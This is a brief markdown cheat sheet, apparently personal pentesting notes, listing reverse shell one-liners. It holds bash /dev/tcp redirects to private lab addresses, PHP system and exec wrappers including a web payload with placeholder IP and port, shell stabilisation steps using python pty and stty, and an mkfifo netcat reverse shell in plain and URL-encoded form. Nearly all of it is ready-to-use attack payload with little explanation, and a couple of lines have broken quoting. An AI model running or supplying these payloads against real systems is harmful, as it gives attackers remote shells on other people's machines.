---
id: reverseshell
aliases: []
tags: []
---


## Bash
`bash -i > /dev/tcp/192.168.49.150/8080 0>&1
	bash -i >& /dev/tcp/192.168.49.150/8080 0>&1`
	
## System:
`system("bash -c \"bash -i >& /dev/tcp/192.168.45.175/445 0>&1\"")`

## Php:
`exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.49.150/8080 0>&1'")`
>**Web:** 
> `<?php exec(\”/bin/bash -c ‘bash -i > /dev/tcp/YOUR_IP/PORT 0>&1’\”); ?>` 
## Python (IppSec method) / stabilize the shell:
> Still in the victim machine
`$ python3 -c 'import pty; pty.spawn("/bin/bash")`
>` Ctrl + Z `  to background the process
`$ stty raw -echo; fg`
(export TERM=xterm)

### If python not available:
`script /dev/null -c /bin/bash` --to be tested
	
### Obfusccated:
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.229 1234 >/tmp/f`
`rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.45.229%201234%20%3E%2Ftmp%2Ff`  --encoded


```
